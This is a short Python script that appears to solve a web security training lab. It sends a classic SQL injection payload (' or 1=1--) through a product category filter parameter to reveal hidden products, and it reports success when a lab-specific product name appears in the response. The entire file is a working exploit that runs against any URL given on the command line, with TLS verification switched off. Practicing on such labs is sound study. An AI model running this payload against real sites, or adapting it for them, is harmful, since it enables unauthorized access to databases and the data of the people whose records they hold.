#Show products that are hidden using or 1=1
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
path = 'filter?category='

def sqli_payload(url):
	payload = "' or 1=1--"
	r = requests.get(url + path + payload, verify=False)
	if "Caution Sign" in r.text:
		return True
	else:
		return False


if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} www.example.com\033[0m')
		sys.exit(1)
	try:
		if sqli_payload(url):
			print('\033[32m[+] SQLi successful!\033[0m')
		else:
			print('SQLi unsuccessful')
	except KeyboardInterrupt:
		print('\n\033[33m[-] Exited...\033[0m')
